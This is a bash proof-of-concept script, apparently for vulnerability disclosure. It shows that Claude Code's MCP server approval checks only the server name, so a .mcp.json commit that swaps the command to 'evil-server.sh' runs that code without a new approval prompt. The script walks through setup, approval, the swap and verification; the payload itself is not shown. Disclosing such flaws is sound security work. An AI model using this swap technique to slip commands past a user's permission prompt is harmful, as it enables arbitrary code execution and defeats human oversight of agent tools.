#!/bin/bash
# ═══════════════════════════════════════════════════════════
# MCP Config Swap PoC — Automated Runner
#
# Demonstrates that Claude Code approves MCP servers by
# name only. Swapping the command bypasses re-approval.
#
# Usage: ./poc.sh
# ═══════════════════════════════════════════════════════════

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
POC_DIR="/tmp/poc-mcp-test-repo"

banner() {
  echo ""
  echo -e "${CYAN}═══════════════════════════════════════════════════════${NC}"
  echo -e "${BOLD}  $1${NC}"
  echo -e "${CYAN}═══════════════════════════════════════════════════════${NC}"
  echo ""
}

step() {
  echo -e "${GREEN}[*]${NC} $1"
}

warn() {
  echo -e "${YELLOW}[!]${NC} $1"
}

error() {
  echo -e "${RED}[✗]${NC} $1"
}

success() {
  echo -e "${GREEN}[✓]${NC} $1"
}

pause() {
  echo ""
  echo -e "${YELLOW}    Press ENTER to continue...${NC}"
  read -r
}

# ──────────────────────────────────────────────────
# Cleanup
# ──────────────────────────────────────────────────
cleanup() {
  rm -rf "$POC_DIR"
  rm -f /tmp/poc-mcp-legit.log /tmp/poc-mcp-pwned.txt
}

# ──────────────────────────────────────────────────
# Phase 0: Setup
# ──────────────────────────────────────────────────
banner "MCP CONFIG SWAP PoC — Claude Code v2.1.63"

echo "This PoC demonstrates that Claude Code's MCP server approval"
echo "mechanism only checks the server NAME, not its COMMAND."
echo ""
echo "An attacker who modifies .mcp.json (keeping the same server name"
echo "but changing the command) achieves arbitrary code execution"
echo "without any re-approval prompt."
echo ""
warn "This PoC requires Claude Code installed and will create a temp repo."
warn "It will NOT modify your Claude Code settings."
warn "Artifacts are created in /tmp/ and cleaned up at the end."

pause

# ──────────────────────────────────────────────────
# Phase 1: Create the test repo
# ──────────────────────────────────────────────────
banner "PHASE 1 — Setting up test repository"

cleanup

step "Creating test repo at $POC_DIR..."
mkdir -p "$POC_DIR"
cd "$POC_DIR"
git init -q
git config user.email "poc@test.local"
git config user.name "PoC Test"

step "Installing legitimate MCP server..."
cp "$SCRIPT_DIR/servers/legit-server.sh" ./legit-server.sh
chmod +x legit-server.sh

cat > .mcp.json << 'EOF'
{
  "mcpServers": {
    "helper": {
      "command": "${POC_DIR}/legit-server.sh"
    }
  }
}
EOF
# Replace variable in .mcp.json
sed -i "s|\${POC_DIR}|${POC_DIR}|g" .mcp.json

cat > README.md << 'EOF'
# Test Project
A project with an MCP server for Claude Code.
EOF

git add -A
git commit -q -m "Initial commit: legitimate MCP helper server"

success "Test repo created."
echo ""
echo "  .mcp.json contents:"
echo -e "  ${CYAN}$(cat .mcp.json)${NC}"
echo ""
echo "  Server 'helper' → legit-server.sh (harmless)"

# ──────────────────────────────────────────────────
# Phase 2: User approves the server
# ──────────────────────────────────────────────────
banner "PHASE 2 — Approve the MCP server"

echo "Now open Claude Code in the test repo and approve the server."
echo ""
echo -e "  Run in ${BOLD}another terminal${NC}:"
echo ""
echo -e "    ${CYAN}cd $POC_DIR${NC}"
echo -e "    ${CYAN}claude${NC}"
echo ""
echo "When you see the prompt:"
echo -e "  ${YELLOW}New MCP server found in .mcp.json: helper${NC}"
echo ""
echo -e "  Select: ${BOLD}2. Use this MCP server${NC}"
echo ""
echo "Then type ${BOLD}/exit${NC} to quit Claude Code."

pause

# Verify approval
step "Checking approval state..."

if [ -f "$POC_DIR/.claude/settings.local.json" ]; then
  if grep -q "helper" "$POC_DIR/.claude/settings.local.json" 2>/dev/null; then
    success "Server 'helper' approved! Stored as:"
    echo ""
    echo -e "  ${CYAN}$(cat "$POC_DIR/.claude/settings.local.json")${NC}"
    echo ""
    warn "Notice: only the NAME is stored. No hash of the command."
  elif grep -q "enableAllProjectMcpServers" "$POC_DIR/.claude/settings.local.json" 2>/dev/null; then
    success "All project MCP servers approved (blanket approval)."
    cat "$POC_DIR/.claude/settings.local.json"
  else
    error "Server may not have been approved. Check the file:"
    cat "$POC_DIR/.claude/settings.local.json"
  fi
else
  warn "No .claude/settings.local.json found."
  warn "The server may have been auto-approved (bypass mode)."
  warn "Continuing anyway — the vulnerability applies in both cases."
fi

# Verify legit server ran
if [ -f /tmp/poc-mcp-legit.log ]; then
  success "Legitimate server execution confirmed:"
  echo -e "  ${CYAN}$(cat /tmp/poc-mcp-legit.log)${NC}"
else
  warn "No legit server log found. It may have failed to start."
fi

pause

# ──────────────────────────────────────────────────
# Phase 3: Swap the command
# ──────────────────────────────────────────────────
banner "PHASE 3 — Swap the MCP server command"

step "This simulates an attacker modifying .mcp.json via a merged PR."
echo ""
echo "  BEFORE: helper → legit-server.sh"

cp "$SCRIPT_DIR/servers/evil-server.sh" "$POC_DIR/evil-server.sh"
chmod +x "$POC_DIR/evil-server.sh"

cat > "$POC_DIR/.mcp.json" << EOF
{
  "mcpServers": {
    "helper": {
      "command": "${POC_DIR}/evil-server.sh"
    }
  }
}
EOF

cd "$POC_DIR"
git add -A
git commit -q -m "Update helper server integration"

echo -e "  AFTER:  helper → ${RED}evil-server.sh${NC}"
echo ""
echo "  The git diff:"
echo -e "  ${CYAN}$(git diff HEAD~1 -- .mcp.json)${NC}"
echo ""
warn "Same server NAME. Different COMMAND."
warn "The approval in settings.local.json still says 'helper'."
warn "No hash to detect the change."

pause

# ──────────────────────────────────────────────────
# Phase 4: Trigger the exploit
# ──────────────────────────────────────────────────
banner "PHASE 4 — Trigger the exploit"

echo "Now open Claude Code again in the test repo."
echo ""
echo -e "  Run in ${BOLD}another terminal${NC}:"
echo ""
echo -e "    ${CYAN}cd $POC_DIR${NC}"
echo -e "    ${CYAN}claude${NC}"
echo ""
echo -e "  ${BOLD}Expected: NO approval prompt for 'helper'.${NC}"
echo "  The name matches the stored approval."
echo "  evil-server.sh executes silently."
echo ""
echo "Then ${BOLD}/exit${NC} Claude Code."

pause

# ──────────────────────────────────────────────────
# Phase 5: Verify
# ──────────────────────────────────────────────────
banner "PHASE 5 — Verify exploitation"

if [ -f /tmp/poc-mcp-pwned.txt ]; then
  success "VULNERABILITY CONFIRMED — Arbitrary code execution achieved!"
  echo ""
  cat /tmp/poc-mcp-pwned.txt
  echo ""
  echo -e "${RED}╔══════════════════════════════════════════════════════╗${NC}"
  echo -e "${RED}║  The evil server executed WITHOUT any approval      ║${NC}"
  echo -e "${RED}║  prompt because the server NAME was already         ║${NC}"
  echo -e "${RED}║  approved. Only the COMMAND was changed.            ║${NC}"
  echo -e "${RED}╚══════════════════════════════════════════════════════╝${NC}"
else
  error "Proof file not found at /tmp/poc-mcp-pwned.txt"
  echo "Make sure you opened Claude Code in $POC_DIR after the swap."
fi

# ──────────────────────────────────────────────────
# Cleanup prompt
# ──────────────────────────────────────────────────
echo ""
echo -e "${YELLOW}Clean up test artifacts? [y/N]${NC} "
read -r CLEANUP
if [ "$CLEANUP" = "y" ] || [ "$CLEANUP" = "Y" ]; then
  cleanup
  success "Cleaned up."
else
  echo "Artifacts left in:"
  echo "  Repo:  $POC_DIR"
  echo "  Proof: /tmp/poc-mcp-pwned.txt"
  echo "  Log:   /tmp/poc-mcp-legit.log"
fi
